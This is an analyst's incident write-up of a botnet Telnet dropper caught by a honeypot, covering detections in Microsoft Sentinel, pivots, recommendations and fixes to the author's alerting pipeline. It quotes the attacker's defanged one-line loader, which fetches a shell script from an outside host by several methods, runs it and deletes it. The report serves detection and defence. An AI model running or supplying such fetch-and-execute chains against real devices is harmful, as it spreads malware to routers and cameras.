Incident report: a one-second Telnet dropper

11 November 2026 · about 10 minutes

This is a write-up of one real attack on my honeypot, done the way I would hand it to the next shift: what happened, how it was detected, what the automation did, what I concluded and what I would do about it. The attack itself is ordinary, and that is why I picked it. Most of a SOC's day is ordinary attacks, and the work is in confirming them quickly and in noticing what the tooling got wrong along the way.

Summary

What
An automated Telnet login as root, a router-CLI escape, then a single command line that tries five ways to download a shell script, makes it executable, runs it and deletes it.
When
2026-11-11 06:55:29 to 06:55:30 UTC. The whole session lasted 1.07 seconds.
Source
A Korea Telecom fixed-line address, AbuseIPDB score 100/100 (36 reports from 30 users).
Impact
None. The target is a Cowrie honeypot; its egress filter blocked the download, so nothing ran.
Detections
6 incidents in Microsoft Sentinel from six rules: four on Cowrie, one on Suricata and one correlating both (3 High, 2 Medium, 1 Low).
Verdict
True positive. Automated propagation by a Mirai-style IoT botnet, most likely sent from another infected device. No human operator was involved.

Sources and scope

  • Cowrie (SSH/Telnet honeypot): every event of the session, as shipped to Sentinel's Cowrie_CL table.
  • Suricata (passive IDS on the same host): alerts in Suricata_CL.
  • Sentinel SecurityIncident and SecurityAlert: what the analytics rules raised and what the SOAR playbooks wrote back.
  • AbuseIPDB, through the enrichment playbook (lookups only; the honeypot never reports).
  • For pivots: the last 30 days of the same tables.

Source addresses are left out of this page, as on all my public honeypot pages. The download host is listed under IOCs, defanged.

What the attacker sent

After the four CLI-escape words, everything happened in one line. I have split it at the semicolons and defanged the host:

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;       # first writable directory
/bin/busybox wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
busybox wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
wget -q -O telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
curl -s -o telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
busybox curl -s -o telnet2.sh hxxp://176[.]65[.]139[.]157/telnet2.sh;
tftp 176[.]65[.]139[.]157 -c get telnet2.sh;                  # two tftp syntaxes
tftp -r telnet2.sh -g 176[.]65[.]139[.]157;
ftpget -v -u anonymous -p anonymous -P 21 176[.]65[.]139[.]157 telnet2.sh telnet2.sh;
chmod 777 telnet2.sh;                                         # make it executable
sh telnet2.sh;                                                # run it
rm -rf telnet2.sh                                             # and remove the evidence

Reading it as an analyst:

  • It doesn't know what it landed on. Eight download methods over HTTP, TFTP and FTP, with and without BusyBox, cover whatever a cheap router or camera happens to ship. A human on a keyboard would have looked first.
  • It doesn't stop to look. Login to disconnect took 0.8 s, with no pause anywhere that a person would need to read the output. This is a script replaying a fixed sequence.
  • The payload is a stage-one script, not the bot itself. Loaders like this normally fetch one binary per CPU architecture next, which is why the egress block mattered: there is no second stage to look at, and also nothing to clean up.
  • The source is a fixed-line consumer ISP with a 100/100 reputation, not a hosting provider. That fits a botnet spreading from devices it has already infected.

One rule stayed silent on purpose. Permissions Changed To Run Or Unlock A File also matches chmod 777 …; sh …, but it excludes lines that contain a download, so a dropper line is counted once, by Download And Execute. One command should mean one alert.

The enrichment playbook wrote the same comment on each incident: the AbuseIPDB result, then the IP's honeypot activity over 30 days (1 session, 1 login, 5 commands, 1 download attempt) with sample commands, and tags abuse:75-100 and has-download. That comment is what lets an analyst close the incident without opening a query window.

Pivots

The download host

Searching 30 days of Cowrie logs for 176[.]65[.]139[.]157 or telnet2.sh finds exactly two sessions: this one, and one on 9 November at 00:01 UTC from a New Zealand mobile carrier's address, also 100/100 on AbuseIPDB. That session logged in as user/user and sent a byte-for-byte identical command line. Same tooling, same infrastructure, two days and two continents apart, which again points to a bot spreading on its own. The earlier session came before the SOAR automation went live (9 November, 15:47 UTC), so it was never enriched.

The password

LSiuY7pOmZG2s isn't a factory default, so I checked whether it fingerprints this bot. It appears once more, eleven hours later, from a different source. That session is a different family: it renames the host to PBOC, probes nine directories for write access, and writes a script with hex-escaped echo -ne chunks instead of downloading one. So the password is shared between families, most likely through the same credential lists, and isn't evidence of a single operator.

The CVE

Suricata labelled the command line CVE-2024-40891, a command injection in Zyxel's Telnet service. The signature matches the shape of the payload over Telnet. My honeypot is not a Zyxel device and the attacker logged in normally first, so I read this as "this bot uses the same delivery as the campaigns that exploit that CVE", not as an exploit attempt that could have worked here. In 30 days this signature fired exactly once, on this session.

Assessment

True positive, no impact. I am highly confident this was automated botnet propagation: the timing, the blind command sequence, the spread of download fallbacks and the identical session from another country all point the same way. That it is Mirai-derived is a medium-confidence call: the CLI escape words and the loader style are typical of that family, but without the second stage I can't name the variant.

On a real network, the same session against an exposed router would have been a compromise: the device would have pulled the bot and started scanning for the next victim. The recommendations below are for that case.

  • Contain: block the download host at the egress firewall or proxy on every port, not just 80. The loader falls back to TFTP and FTP.
  • Hunt: search firewall, proxy and DNS logs for any internal host that has contacted 176[.]65[.]139[.]157, and treat any hit as an infected device.
  • Harden: close Telnet (23/tcp) at the perimeter, disable it on devices that offer it, and replace factory and shared credentials. This attack needs nothing more than an open Telnet port and a password from a list.
  • Enrich: check the URL against URLhaus and VirusTotal for a second stage and hashes. I haven't done that here; it is the next step if this were a live case.

What it showed me about my own pipeline

Working one incident end to end turned up four things I wouldn't have seen from the dashboards.

  1. Detection took 66 minutes for the Cowrie rules. The shipper sends every 10 minutes and the rules run hourly on what was ingested in the last hour. The Cowrie events arrived at 07:05, four minutes after the 07:01 run, so they waited for 08:01. Suricata's alert, shipped sooner, became an incident in 6 minutes. For the High rules I could run every 10–15 minutes, or move them to near-real-time rules.
  2. The first enrichment was stale. Incident 279 was enriched at 07:01, when the honeypot data wasn't in yet, so its comment says "0 sessions, 0 commands" for an IP that had logged in and run a dropper. The playbook only runs on creation. It should also run when a new alert joins the incident, or the comment should say when its data ends.
  3. One session made six incidents and three Telegram messages. Grouping works per rule, not across rules. For a SOC this is alert fatigue: six tickets to close for one second of activity. The fix is an incident per source IP across all rules, or one correlation rule that raises a single "dropper chain" incident with the others attached as evidence.
  4. The same event alerted twice. Incident 279 holds two alerts an hour apart that contain the identical Suricata record. Across all rules, of the roughly 300 alerts in three days whose event I could extract, 12 repeat an earlier record. Grouping folds them into the existing incident, so nothing was double-counted as an incident, but the one-hour ingestion window evidently overlaps between runs. I haven't confirmed the cause yet.

Smaller notes: incident 284 shows no tactic in Sentinel, because Sentinel's API has no value yet for ATT&CK v20's Stealth tactic (a known limit in uig-detections); and 285 took 129 s to enrich where the others took 2–3 s.

None of these change the verdict on this attack. They change how much I would trust the pipeline's timing and its comments on a busier day, and they are now my next fixes.

Follow-up, same day: all four fixed

  1. Duplicate alerts: cause found. Every alert's creation time is about 300 s after the end of its query window (median 303 s), and the second alert in 279 could only have matched if ago(1h) is measured from the window's end. So Sentinel runs the query five minutes late with now() set to the end of the window. Events ingested in those five minutes were caught by that run and again by the next. The query now reads ingestion_time() > ago(15m) and ingestion_time() <= now(), which makes the windows back to back. The few remaining duplicates came from redeploys, which start a fresh schedule.
  2. Latency: rules now run every 15 minutes instead of hourly, all 17 of them. A Cowrie event now waits at most about 30 minutes for its incident (10 minutes of shipping, up to 15 to the next run, 5 of Sentinel's delay), not 66. After the deploy, the window ends moved from hourly to every 15 minutes (19:51, then 20:06).
  3. Stale enrichment: the playbook waits when it finds nothing. Re-running on "alert added" wouldn't have helped 279: once the duplicates are fixed, nothing new joins it, and the Cowrie data lands in other incidents. Instead, if the honeypot query finds 0 sessions, the playbook waits 10 minutes (one shipper cycle) and asks once more, and the comment says when it queried. Incidents from Cowrie rules always have sessions, so they skip the wait: the first real one after the deploy was enriched in 3 s. The end-to-end test passed 6 of 6 checks, and its comment came 604 s after the incident, as designed.
  4. Six incidents for one session: now one. Sentinel groups alerts into incidents only within one rule, so the detection rules now raise alerts only. A new rule, Honeypot activity, reads their new alerts every 5 minutes and raises one alert per IP with the highest severity, the rules that fired and their tactics and techniques. Its incidents group by IP and severity over a day. Severity is part of the key because Sentinel doesn't raise an open incident's severity when a worse alert joins it, so a High alert for an IP with an open Medium incident opens a new High one and notifies. The 251 incidents of the two days before came from 74 IPs. The first real one after the change: four rules fired on one session, and it became one High incident, enriched in 4 s, with one Telegram message. The cost is 5 to 10 more minutes before the incident exists.

The changes are in uig-detections 0363134 and 3209ad9. In a few days I'll recount the duplicate alerts on live data to confirm the first fix holds.
